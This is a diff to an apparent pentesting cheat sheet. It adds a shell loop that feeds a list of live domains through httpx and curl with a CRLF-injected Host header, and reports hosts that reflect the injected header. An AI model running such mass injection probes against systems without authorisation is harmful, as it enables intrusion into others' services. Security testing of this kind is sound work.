@@ -116,6 +116,11 @@ curl -H "Host: target.com%0d%0aX-Injected: test" "http://target.com/"
 
 # Automated Host header injection testing
 cat alive-domains.txt | xargs -I@ curl -H "Host: @%0d%0aX-Injected: test" "http://@" -I | grep -q "X-Injected" && echo "Vulnerable: @"
+
+# Automated Host header injection testing
+cat alive-domains.txt | httpx -silent -ports 80,443 | while read url; do
+  curl -sI "http://$url" -H "Host: test%0d%0aX-Injected: test" 2>/dev/null | grep -i "X-Injected" && echo "VULN: $url"
+done
 ```
 
 ### 5. Cache Poisoning via CRLF
